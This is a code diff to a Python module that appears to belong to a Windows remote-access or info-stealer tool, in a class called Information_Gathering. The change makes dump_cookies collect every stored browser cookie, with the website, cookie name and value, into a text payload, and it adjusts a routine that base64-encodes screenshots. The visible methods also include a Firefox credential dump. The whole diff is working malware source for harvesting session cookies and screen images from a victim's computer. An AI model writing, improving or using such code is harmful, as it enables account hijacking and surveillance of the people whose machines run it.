@@ -18,7 +18,12 @@ import win32api
 import win32con
 import logging
 import browsercookie
+import base64
+import pyscreenshot
 from common import *
+from misc import Miscellaneous
+
+ASCIIfy = Miscellaneous().ASCIIfy
 
 class Information_Gathering:
 	"""
@@ -86,10 +91,16 @@ class Information_Gathering:
 		return output
 		
 	def dump_cookies(self):
-		cookie_dict = browsercookie.load()._cookies
-		serialized = json.dumps(cookie_dict)
-		
-		return serialized+chr(253)
+		c = browsercookie.load()
+		output = ""
+		for key in c._cookies.keys():
+			output += "Website: "+key+"\n"
+			for key1 in c._cookies[key].keys():
+				for key2 in c._cookies[key][key1].keys():
+					cookie = c._cookies[key][key1][key2]
+					output +="  "+cookie.name+":"+cookie.value+"\n"
+					
+		return ASCIIfy(output) + chr(1)
 		
 	@windows_only
 	def dump_firefox(self): 
@@ -439,6 +450,7 @@ class Information_Gathering:
 			
 			return base64.b64encode(img_data)+"|"+str(width)+"|"+str(height)+"|"
 		except Exception as e:
-			return "A|1|1|"
+			logging.error(e)
+			return "AAAA|1|1|"
 		
 info = Information_Gathering()
